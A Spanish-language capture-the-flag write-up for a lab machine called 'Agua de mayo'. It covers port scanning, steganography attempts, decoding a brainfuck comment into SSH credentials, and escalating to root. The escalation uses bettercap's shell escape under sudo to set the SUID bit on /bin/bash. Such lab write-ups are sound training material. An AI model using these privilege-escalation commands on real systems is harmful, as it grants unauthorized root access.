# Agua de mayo
## Reconocimiento
### Nmap
Primero escaneo los puertos con nmap, la máquina tiene abierto un servicio SSH y un servidor HTTP, a falta de más información voy a echarle un ojo a la página.

![Página principal](./imgs/2.png)

Al aterrizar en la raíz veo la página por defecto de Apache2, lo lógico ahora es fuzzear en busca de directorios o archivos que puedan resultar útiles.
El fuzzeo revela la ruta `/images`, que tiene dentro una imagen llamada "agua_ssh.jpg". Voy a asumir por el nombre que lleva oculta la clave para acceder por ssh de alguna forma, probablemente esteganografía.
Descargo la imagen y lo primero que pruebo es a user `exiftool` por si hubiera algún metadato en la imagen que pudiera revelar información, pero no veo nada interesante, lo siguiente va a ser usar `steghide`.
Trato de leer la información contenida en la imagen pero no puedo sin la passphrase correspondiente
```
❯ steghide extract -sf agua_ssh.jpg
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```
Después de investigar un poco doy con la herramienta `stegseek`, que permite atacar mediante diccionario a imágenes con información oculta, pasarle el rockyou completo y ver que no funciona vuelvo a la página de Apache para examinar el código fuente. Allí me topo con un comentario que se intentó ocultar a base de muchos saltos de línea, que asumo que es algún tipo de codificación.

```html
<!--
++++++++++[>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>++++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>+++++++++++>+>+<<<<<<<<<<<<<<<<<-]>--.>+.>--.>+.>---.>+++.>---.>---.>+++.>---.>+..>-----..>---.>.>+.>+++.>.
-->
```

Solo de copiar y pegar el contenido en un buscador me salen varias entradas sobre el código *brainfuck*, así que voy a un decodificador y saco la siguiente contraseña: bebeaguaqueessano

Basándome en el nombre del archivo que descargué antes, voy a asumir que agua:bebeaguaqueessano son las claves para acceder mediante SSH a la máquina.
## Post-explotación

Al entrar hago un `sudo -l` y veo que se puede lanzar bettercap con privilegios de root, como no sale en GTFObins asumo que es algún tipo de software descargado y veo de que se trata. Al entrar con `sudo bettercap` y lanzar `help` veo que con un signo de exclamación puedo ejecutar comandos como root.

![Bettercap](./imgs/2.png)

Ahora es tan simple como añadir el bit SUID al binario bash, de manera que al lanzarlo con el flag `-p` herede los permisos de su dueño (root).
```
172.17.0.0/16 > 172.17.0.2  » !chmod u+s /bin/bash
```

```
agua@ba136352501b:~$ bash -p
bash-5.2# whoami
root
```